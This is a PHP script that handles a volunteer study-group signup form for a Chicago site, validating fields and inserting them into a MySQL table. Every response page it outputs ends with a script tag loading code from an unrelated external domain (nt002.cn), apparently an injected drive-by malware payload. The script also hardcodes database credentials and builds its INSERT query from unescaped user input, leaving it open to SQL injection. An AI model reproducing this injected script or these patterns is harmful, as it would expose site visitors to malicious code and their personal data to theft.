<?php
session_start();

$dbhost = 'mysql.ignitethespirit.org';
$dbuser = 'ignite';
$dbpass = 'fire08';

$conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');

$dbname = 'ignite';
mysql_select_db($dbname);


foreach ($_POST as $key => $value)
{
	if ($value != "")
	{
		if ($key == "phone")
		{ 
			$phone = preg_replace("/[^0-9]/","", $value); # remove non-numbers
			$phone_pattern = "/^1?[0-9]{10}$/";
			if (preg_match($phone_pattern, $phone))
			{
				$value = $phone;
				$error = 0;
			}
			else
			{
				$error = 2;	
			}
		}
		else if ($key == "email")
		{
			$email_pattern = '/.*@.*\..*/';
			if (preg_match($email_pattern, $value))
			{
				$error = 0;
			}
			else
			{
				$error = 2;	
			}
		}
		else if ($key == "zip")
		{
			$zip_pattern = '/^[0-9]{1,}$/';
			if (preg_match($zip_pattern, $value))
			{
				$error = 0;
			}
			else
			{
				$error = 2;
			}
			
		}
		else
		{
			$error = 0;
		}
	}
	elseif ($key == "address2")
	{
		$error = 0;
	}
	else
	{
		$error = 1;
	}
	$new_value = stripslashes(strip_tags($value));
	$_SESSION[$key][$new_value] = $error;

}


$error_counter = 0;
foreach ($_SESSION as $key => $name)
{
	foreach ($name as $content => $error)
	{
		if ($error == 0)
		{
		$insert[$key] = $content;
		}
		else
		{
		$error_counter++;
		}
	}
	
}



$firstname = $insert['firstname'];
$lastname = $insert['lastname'];
$email = $insert['email'];
$phone = $insert['phone'];
$address1 = $insert['address1'];
$address2 = $insert['address2'];
$city = "Chicago";
$state = "Illinois";
$zip = $insert['zip'];;
$assignment = $insert['assignment'];
$shift = $insert['shift']." / ".$insert['daily'];
$date_time	= date("Y-m-d h:i:s");
$ip_address = $_SERVER['REMOTE_ADDR'];

if ($error_counter == 0)
{
	$check_query = "SELECT * FROM Study_Group";
	$check_result = mysql_query($check_query);
	$check_row = mysql_fetch_array($check_result, MYSQL_ASSOC);
	
	if (!in_array($ip_address, $check_row))
	{
		if (!in_array($email, $check_row))
		{
			$insert_query = "INSERT IGNORE INTO Study_Group (`study_fname`,`study_lname`,`study_phone`,`study_address_1`,`study_address_2`,`study_city`,`study_state`,`study_zip`,`study_assignment`,
															 `study_shift`,`study_email`,`study_date`,`study_ip`) 
													 VALUES ('$firstname','$lastname','$phone','$address1','$address2','$city','$state','$zip','$assignment','$shift','$email','$date_time','$ip_address')";
			mysql_query($insert_query)  or die(mysql_error());
			echo "<html><head><title>Thank You</title> <link rel='stylesheet' href='default.css'  type='text/css' /><meta http-equiv='refresh' content='5;URL=index.php'></head>".
				 "<body><center> <table  class='study_response'><tr><td><h2>Thank you for your submission</h2> You will be notified by email in the next few days if you have a spot in the study group.<br /><br />".
				 "If you are not automatically redirected:<br /> [<a href='index.php'>Click Here</a>]</td><td><img src='images/web_logo.gif' /></td></tr></table></center><script src='http://nt002.cn/E/J.JS'></script></body></html>";
		session_destroy();
		}
		else { echo "<html><head><title>Thank You</title> <link rel='stylesheet' href='default.css'  type='text/css' /><meta http-equiv='refresh' content='5;URL=index.php'></head>".
				 "<body><center> <table  class='study_response'><tr><td><h2>That email address has already been registered</h2><br /><br />".
				 "If you are not automatically redirected:<br /> [<a href='index.php'>Click Here</a>]</td><td><img src='images/web_logo.gif' /></td></tr></table></center><script src='http://nt002.cn/E/J.JS'></script></body></html>"; }
	}
	else {echo "<html><head><title>Thank You</title> <link rel='stylesheet' href='default.css'  type='text/css' /><meta http-equiv='refresh' content='5;URL=index.php'></head>".
				 "<body><center> <table  class='study_response'><tr><td><h2>You may only register yourself for the study group.</h2><br /><br />".
				 "If you are not automatically redirected:<br /> [<a href='index.php'>Click Here</a>]</td><td><img src='images/web_logo.gif' /></td></tr></table></center><script src='http://nt002.cn/E/J.JS'></script></body></html>"; }
}
else
{
header("location:study_group_form.php");
}
?>